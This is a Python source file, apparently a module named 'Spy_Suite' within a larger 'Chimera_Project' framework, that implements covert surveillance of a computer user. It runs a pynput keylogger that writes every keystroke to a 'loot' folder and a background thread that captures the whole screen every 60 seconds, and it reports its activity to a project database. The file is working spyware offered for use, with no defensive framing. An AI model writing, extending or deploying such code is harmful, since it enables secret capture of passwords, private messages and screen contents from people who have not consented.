import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import logging
from threading import Thread
from pynput import keyboard
from PIL import ImageGrab # Standard for cross-platform screenshots
import time

# GPS Line
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class Spy_Suite:
    def __init__(self):
        self.agent_id = "61"
        self.name = "Spy_Suite"
        self.db = ChimeraDB()
        self.loot_path = "/home/dan/Chimera_Project/loot/spy_data/"
        
        if not os.path.exists(self.loot_path):
            os.makedirs(self.loot_path)

        # Logging setup for keystrokes
        logging.basicConfig(filename=(self.loot_path + "keylog.txt"), 
                            level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(self, key):
        """Callback for every key press."""
        try:
            logging.info(str(key.char))
        except AttributeError:
            logging.info(str(key)) # For special keys like Space/Enter

    def capture_screen(self):
        """Takes a screenshot every 60 seconds."""
        while True:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            screenshot = ImageGrab.grab()
            screenshot.save(f"{self.loot_path}screenshot_{timestamp}.jpg", "JPEG", quality=20) # Low quality = Smaller file
            time.sleep(60)

    def run_keylogger(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def run(self):
        self.db.heartbeat(self.name)
        
        # Start Screen Capture in a background thread
        screen_thread = Thread(target=self.capture_screen)
        screen_thread.daemon = True
        screen_thread.start()
        
        # Start Keylogger (this stays in the main thread)
        self.logger_info = "Spy Suite Active: Monitoring Keys and Screen."
        self.run_keylogger()

if __name__ == "__main__":
    # Requirements: pip install pynput pillow
    agent = Spy_Suite()
    agent.run()
